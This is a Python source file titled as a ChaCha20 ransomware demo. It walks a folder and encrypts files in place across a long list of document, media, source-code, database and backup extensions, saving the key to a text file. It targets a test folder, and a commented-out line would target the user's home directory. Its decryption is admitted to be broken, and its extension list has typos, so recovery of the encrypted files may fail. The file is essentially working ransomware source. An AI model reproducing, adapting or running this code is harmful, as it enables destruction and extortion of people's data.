''' ChaCha20 Ransomware Demo '''

# Modules
import argparse                                 # Parse CLI args
import base64                                   # Readable key
from Crypto.Cipher import ChaCha20              # Cryptography
from Crypto.Random import get_random_bytes      # Random key
import os                                       # Os.walk function
from os.path import expanduser                  # Expand user home


# XXX: As ChaCha20 does not verify the integrity of data, an attacker may
# manipulate it's content before decryption, to avoid this use ChaCha20_Poly1305
# FIXME: Decryption is not properly working, you can't use the same object of
# encryption for decryption, as mentioned in https://stackoverflow.com/a/54082879


# Main Code Here
class Ransomware:

    #  Handler
    def __init__(self):
        self.key = None
        self.cipher = None
        self.file_ext =  [
            # System files
            'exe,', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img'  

            # Media files
            'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw',  
            'mp3', 'mp4', 'm4a', 'aac', 'ogg', 'flac', 'wav', 'wma', 'aiff', 'ape',  
            'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp',  

            # Document files
            'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx',
            'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md',

            # Config files
            'yml', 'yaml', 'json', 'xml', 'csv',

            # Database files
            'db', 'sql', 'dbf', 'mdb', 'iso',

            # Source-code files
            'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css',
            'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx',
            'java', 'class', 'jar',
            'ps', 'bat', 'vb',
            'awk', 'sh', 'cgi', 'pl', 'ada', 'swift',
            'go', 'py', 'pyc', 'bf', 'coffee',

            # Backup files
            'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',
        ]

    # Create encryption key
    def generate_key(self):
        self.key = get_random_bytes(32) # Must be 32 bytes long
        self.cryptor = ChaCha20.new(key=self.key)
        self.write_key()

    # Read key for decryption
    def read_key(self, key):
        self.key = base64.b64decode(key.encode())
        print(len(self.key))
        self.cryptor = ChaCha20.new(key=self.key, nonce=self.key)

    # Save key into external file
    def write_key(self):
        with open('KEY.txt', 'w') as fout:
            fout.write(f'[+] Decryption Key: {base64.b64encode(self.key).decode()}\n')

    # Search files for encryption
    def search_files(self, encrypted=False):
        for root, _, files in os.walk(test):
            for file in files:
                if file.split('.')[-1] in self.file_ext:
                    print(f'[+] Encrypting file: {os.path.join(root, file)}')
                    self.encrypt(os.path.join(root, file), encrypted=encrypted)

    # Encrypt files 
    def encrypt(self, file, encrypted):
        with open(file, 'rb+') as fin:
            _data = fin.read()
            data = self.cryptor.decrypt(_data) if encrypted else self.cryptor.encrypt(_data)
            fin.seek(0)
            return fin.write(data)

if __name__ == '__main__':

    # root = expanduser('~')    # Encrypt user's home folder
    test = "./testing"          # Encrypt demo folder

    parser = argparse.ArgumentParser()
    parser.add_argument('-k', '--key')
    args = parser.parse_args()
    
    ransom = Ransomware()

    if args.key:
        ransom.read_key(args.key)
        ransom.search_files(encrypted=True)
    else:
        ransom.generate_key()
        ransom.search_files()
        